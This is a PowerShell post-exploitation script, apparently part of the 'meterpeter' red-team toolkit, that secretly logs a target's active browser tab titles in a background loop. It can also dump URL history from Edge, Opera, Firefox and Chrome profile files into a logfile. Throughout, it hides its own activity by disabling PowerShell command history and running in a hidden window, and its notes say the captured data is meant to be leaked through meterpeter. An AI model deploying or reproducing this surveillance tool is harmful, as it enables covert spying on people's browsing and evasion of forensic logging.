<#
.SYNOPSIS
   Browser active tab title enumeration

   Author: @r00t-3xp10it
   Tested Under: Windows 10 (19044) x64 bits
   Required Dependencies: Get-Process
   Optional Dependencies: none
   PS cmdlet Dev version: v1.1.3
   
.DESCRIPTION
   Spy target active tab browsing history (windows title)
   and store results under '$pwd\Browser.report' logfile.
   This allows users to execute cmdlet in background while
   it records target user browsing history + windows title

.NOTES
   Browsers supported: MsEdge,Chrome,Chromium,Opera,Safari,Brave
   Param -starttime 'int' requires 'HOURS:MINUTS' string format.
   Parameter -history switch dumps installed browsers url history
   Cmdlet stores process PId into Browser.report logfile so that
   meterpeter can stop process by is ID identifier and leak data.

.Parameter Delay
   Delay time between captures (default: 3)

.Parameter History
   Dumps Installed browsers history switch

.Parameter Log
   Switch that creates cmdlet results logfile

.Parameter StartTime
   Start capture at selected time (default: false)

.Parameter Force
   Bypass: none supported browsers found active (default: false)

.EXAMPLE
   PS C:\> .\BrowserLogger.ps1 -delay '5'
   Enumerate with 5 secs between captures

.EXAMPLE
   PS C:\> .\BrowserLogger.ps1 -log
   Store results on logfile ($pwd)

.EXAMPLE
   PS C:\> .\BrowserLogger.ps1 -starttime '09:07'
   Start capture at selected -starttime 'HOURS:MINUTS'

.EXAMPLE
   PS C:\> .\BrowserLogger.ps1 -history
   Dumps installed browsers url history

.EXAMPLE
   PS C:\> Start-Process -WindowStyle hidden powershell -argumentlist "-file BrowserLogger.ps1 -force 'true' -log"
   Execute cmdlet in background even if none browsers are found 'active' and store results on $pwd\Browser.report

.INPUTS
   None. You cannot pipe objects into BrowserLogger.ps1

.OUTPUTS
   Browser active tab title enumeration

     Process Id      : 10052
     Start Capture   : 04:10:59
     Capture Delay   : 3 (seconds)


     Browser         : msedge
     Capture Time    : 04:10:59
     Product Version : 109.0.1518.78
     Product Path    : C:\Program Files (x8)\Microsoft\Edge\Application\msedge.exe
     Windows Title   : Afundado porta avioes São paulo, após meses a deriva - Microsoft Edge

     Browser         : opera
     Capture Time    : 04:10:59
     Product Version : 93.0.4585.84
     Product Path    : C:\Users\pedro\AppData\Local\Programs\Opera GX\opera.exe
     Windows Title   : PowerShell script to check which browsers are running - Stack Overflow - Opera

.LINK
   https://github.com/r00t-3xp10it/redpill
   https://github.com/r00t-3xp10it/meterpeter
   https://www.hexnode.com/mobile-device-management/help/script-to-fetch-browsing-history-on-windows-10-devices
#>


[CmdletBinding(PositionalBinding=$false)] param(
   [string]$StartTime="false",
   [string]$Force="false",
   [switch]$History,
   [int]$Delay='3',
   [switch]$Log
)


$CmdletVersion = "v1.1.3"
$ErrorActionPreference = "SilentlyContinue"
## Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
write-host "`nBrowser active tab title enumeration" -ForegroundColor Green
$host.UI.RawUI.WindowTitle = "@BrowserLogger $CmdletVersion {SSA@RedTeam}"

If($Delay -lt 3)
{
   [int]$Delay='3'
   write-host " - [delay] wrong input, default to $Delay (sec)`n" -ForegroundColor Red
   Start-Sleep -Milliseconds 700
}


If($StartTime -Match '^(\d+\d+:+\d+\d)$')
{
   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Schedule capture function.
   #>

   write-host "  - " -ForegroundColor Red -NoNewline
   write-host "Schedule capture to: [" -NoNewline
   write-host "$StartTime" -ForegroundColor Red -NoNewline
   write-host "] hours."

   while($true)
   {
      ## Compare $CurrentTime with $StartTime
      $CurrentTime = (Get-Date -Format 'HH:mm')
      If($CurrentTime -Match "$StartTime")
      {
         break # Continue BeowserLogger execution
      }

      ## loop each 10 seconds
      Start-Sleep -Seconds 10
   }
}

If($log.IsPresent)
{
   ## Create logfile
   echo "Browser active tab title enumeration.`n" > "$pwd\Browser.report"
}

If($History.IsPresent)
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Dump browsers URL history
   #>

   ## Regex string to search
   $Regex = '([a-zA-Z]{3,})://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'

   ## Get Edge History
   $MsEdgeHistory = "$Env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History" 
   If(-not(Test-Path -Path "$MsEdgeHistory"))
   {
      New-Object -TypeName PSObject -Property @{
         Browser = "Edge"
         UrlHistory = "None history entrys found."
      }

      If($log.IsPresent)
      {
         echo "Browser: Edge    History: None history entrys found." >> "$pwd\Browser.report"
      }
   }
   Else
   {
      $Value = Get-Content -Path "$MsEdgeHistory"|Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique 
      $Value | ForEach-Object { 
         $Key = $_ 
         If($Key -Match $Search)
         { 
            New-Object -TypeName PSObject -Property @{
               Browser = "Edge"
               UrlHistory = $_ 
            }

            If($log.IsPresent)
            {
               echo "Browser: Edge    History: $_" >> "$pwd\Browser.report"
            }
         } 
      }
   }

   ## Get Opera History
   $OperaHistory = "$Env:APPDATA\Opera Software\Opera*\History" 
   If(-not(Test-Path -Path "$OperaHistory"))
   {
      New-Object -TypeName PSObject -Property @{
         Browser = "Opera"
         UrlHistory = "None history entrys found."
      }

      If($log.IsPresent)
      {
         echo "Browser: Opera   History: None history entrys found." >> "$pwd\Browser.report"
      }
   } 
   Else
   {
      $Value = Get-Content -Path "$OperaHistory"|Select-String -AllMatches $Regex | % {($_.Matches).Value} | Sort -Unique 
      $Value | ForEach-Object { 
         $Key = $_ 
         If($Key -Match $Search)
         { 
            New-Object -TypeName PSObject -Property @{
               Browser = "Opera"
               UrlHistory = $_ 
            }

            If($log.IsPresent)
            {
               echo "Browser: Opera   History: $_" >> "$pwd\Browser.report"
            }
         }
      }
   }

   ## Get Firefox History
   $FirefoxHistory = "$Env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\places.sqlite" 
   If(-not(Test-Path -Path "$FirefoxHistory"))
   { 
      New-Object -TypeName PSObject -Property @{
         Browser = "Firefox"
         UrlHistory = "None history entrys found."
      }

      If($log.IsPresent)
      {
         echo "Browser: Firefox History: None history entrys found." >> "$pwd\Browser.report"
      }
   } 
   Else
   {
      $Value = Get-Content -Path "$FirefoxHistory"|Select-String -AllMatches $Regex |% {($_.Matches).Value} |Sort -Unique 
      $Value | ForEach-Object { 
         $Key = $_ 
         If($Key -Match $Search)
         { 
            New-Object -TypeName PSObject -Property @{
               Browser = "Firefox"
               UrlHistory = $_
            }

            If($log.IsPresent)
            {
               echo "Browser: Firefox History: $_" >> "$pwd\Browser.report"
            }
         } 
      } 
   }

   ## Get Chrome History
   $ChromeHistory = "$Env:LOCALAPPDATA\Google\Chrome\User Data\Default\History" 
   If(-not(Test-Path -Path "$ChromeHistory"))
   {
      New-Object -TypeName PSObject -Property @{
         Browser = "Chrome"
         UrlHistory = "None history entrys found."
      }

      If($log.IsPresent)
      {
         echo "Browser: Chrome  History: None history entrys found." >> "$pwd\Browser.report"
      }
   } 
   Else
   {
      $Value = Get-Content -Path "$ChromeHistory"|Select-String -AllMatches $Regex |% {($_.Matches).Value} |Sort -Unique 
      $Value | ForEach-Object { 
         $Key = $_ 
         If($Key -Match $Search)
         { 
            New-Object -TypeName PSObject -Property @{
               Browser = "Chrome"
               UrlHistory = $_
            }

            If($log.IsPresent)
            {
               echo "Browser: Chrome  History: $_" >> "$pwd\Browser.report"
            }
         } 
      }
   }

   If($log.IsPresent)
   {
      echo "" >> "$pwd\Browser.report"
   }
   write-host ""
}


## Browser names
$BrowserNames = @(
   "Chromium",
   "Safari",
   "Chrome",
   "msedge",
   "Opera",
   "Brave"
)


If($Force -iMatch '^(false)$')
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Make sure there are active browsers.
   #>

   $TestBrowsers = @()
   ForEach($Tokens in $BrowserNames)
   {
      ## Get only names from active browsers
      $Stats = (Get-Process -Name "$Tokens").MainWindowHandle|Where-Object{$_ -NotMatch '^(0)$'}
      If(-not([string]::IsNullOrEmpty($Stats)))
      {
         $TestBrowsers += "$Tokens"
      }
   }

   ## Make sure we have active browser names
   If([string]::IsNullOrEmpty($TestBrowsers))
   {
      write-host " - Error: none supported browsers found active.`n" -ForegroundColor Red
      return
   }
}


$PPID = $PID
## Print OnScreen
$ActiveBrowsers = $BrowserNames.Split(' ')
$StartDate = (Get-Date -Format 'HH:mm:ss')
write-host "`n  Process Id      : $PPID"
write-host "  Start Capture   : $StartDate"
write-host "  Capture Delay   : $Delay (seconds)"
If($log.IsPresent)
{
   write-host "  Logfile         : " -NoNewline
   write-host "$pwd\Browser.report" -ForegroundColor Red

   ## Write on logfile
   echo "`n  Process Id      : $PPID" >> "$pwd\Browser.report"
   echo "  Start Capture   : $StartDate" >> "$pwd\Browser.report"
   echo "  Capture Delay   : $Delay (seconds)" >> "$pwd\Browser.report"
   echo "  Logfile         : $pwd\Browser.report" >> "$pwd\Browser.report"

}


write-host ""
while($true)
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Loop funtion that retrieves browser titles.
   #>

   ForEach($Item in $ActiveBrowsers)
   {
      ## Filter msedge process that runs in background by default
      # and dont have any 'MainWindowTitle' strings to display ( empty )
      $FilterEdge = (Get-Process -Name "$Item").MainWindowHandle|Where-Object{$_ -NotMatch '^(0)$'}
      If(-not([string]::IsNullOrEmpty($FilterEdge)))
      {
         ## Get browser information
         $CurrentDate = (Get-Date -Format 'HH:mm:ss')
         $BrowserPath = (Get-Process -Name "$Item").Path|Select -Last 1
         $BrowserName = (Get-Process -Name "$Item").Name|Select -Last 1
         $Browservers = (Get-Process -Name "$Item").ProductVersion|Select -Last 1
         $WindowTitle = (Get-Process -Name "$Item").MainWindowTitle|Where-Object{$_.MainWindowTitle -ne ""}|Where-Object{$_ -ne ''}

         ## Print OnScreen captured windows title
         write-host "`n  Browser Name    : $BrowserName"
         write-host "  Capture Time    : " -NoNewline
         write-host "$CurrentDate" -ForegroundColor DarkYellow
         write-host "  Product Version : $Browservers"
         write-host "  Product Path    : $BrowserPath"
         write-host "  Windows Title   : " -NoNewline
         write-host "$WindowTitle" -ForegroundColor Green

         If($log.IsPresent)
         {
            ## Add entrys found to logfile
            echo "`n  Browser Name    : $BrowserName" >> "$pwd\Browser.report"
            echo "  Capture Time    : $CurrentDate" >> "$pwd\Browser.report"
            echo "  Product Version : $Browservers" >> "$pwd\Browser.report"
            echo "  Product Path    : $BrowserPath" >> "$pwd\Browser.report"
            echo "  Windows Title   : $WindowTitle" >> "$pwd\Browser.report"      
         }
      }
   }

   ## Delay time between captures
   Start-Sleep -Seconds $Delay
}

write-host ""